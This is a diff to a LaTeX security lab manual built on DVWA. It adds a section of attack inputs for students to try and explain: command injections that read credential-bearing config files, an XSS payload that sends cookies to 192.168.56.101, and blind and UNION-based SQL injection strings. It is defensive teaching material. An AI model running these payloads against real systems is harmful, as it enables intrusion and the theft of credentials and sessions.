@@ -109,9 +109,65 @@ Change DVWA Security level to low (for beginners)
  \centering 
  \includegraphics[width=0.8\textwidth]{DVWA_Main_Page.pdf}
  \rule{30em}{0.5pt}  
- \caption{Damn Vulnerable Web Application - Homepage} 
- \label{Damn Vulnerable Web Application - Homepage} 
+ \caption{Damn Vulnerable Web Application - default page} 
+ \label{Damn Vulnerable Web Application - default page} 
 \end{figure}
+
+\subsection{Testing vulnerabilities}
+For understanding a defence of web application a basic offensive knowledge and skills are needed. However, this lab focused on defensive methods and will not provide knowledge about different \gls{OWASP} top ten. 
+
+\colorbox{red}{\parbox{\textwidth}{DISCLAIMER: Do not use followed methods on any computer except lab computer and only for learning propose!}}
+
+\subsubsection{Command execution}
+Read command execution material given in Command Execution menu and try and explaing following commands and results.
+
+\begin{minted}[frame=lines,framesep=2mm]{bash}
+8.8.8.8; sed 's/</UUUU/' ../../config/config.inc.php
+
+#Find out directory and file structure of \gls{DVWA}
+8.8.8.8; ls -l 
+8.8.8.8; ls -l ../
+8.8.8.8; ls -l ../../
+8.8.8.8; sed 's/<//'  ../../../../wordpress/wp-config.php
+8.8.8.8; touch /var/tmp/new_file.txt
+8.8.8.8; ls /var/tmp/
+\end{minted}
+
+Try following command and explain what can describe output of following command?
+\begin{minted}[frame=lines,framesep=2mm]{bash}
+; grep session.cookie_httponly /etc/php5/apache2/php.ini
+\end{minted}
+What attack vectors are possible when cookie\_httponly is set or not?
+
+\begin{minted}[frame=lines,framesep=2mm]{bash}
+session.cookie_httponly = 1
+\end{minted}
+
+What are better solution $0 or 1$?
+\begin{minted}[frame=lines,framesep=2mm]{bash}
+session.cookie_httponly = 0
+\end{minted}
+XSS
+\begin{minted}[frame=lines,framesep=2mm]{bash}
+<script>var i='<img src="http://192.168.56.101/'+document.cookie+'" />'; document.write(i);</script>
+\end{minted}
+veel XSSi
+\begin{minted}[frame=lines,framesep=2mm]{bash}
+%3Cscript%3Evar+i%3D%27%3Cimg+src%3D%22http%3A%2F%2F192.168.56.101%2F%27%2Bdocument.cookie%2B%27%22+%2F%3E%27%3B+document.write%28i%29%3B%3C%2Fscript%3E
+\end{minted}
+SQLi
+\begin{minted}[frame=lines,framesep=2mm]{bash}
+#blind
+1' union select BENCHMARK(100000000,ENCODE('hello','goodbye')),1; # --
+ 
+ 
+2' UNION SELECT TABLE_SCHEMA, TABLE_NAME FROM information_schema.TABLES;# --
+ 
+ 
+3' union  select TABLE_NAME,COLUMN_NAME from information_schema.columns; # --
+
+\end{minted}
+
 
 
 \section{Installation of SQL Application Firewall}
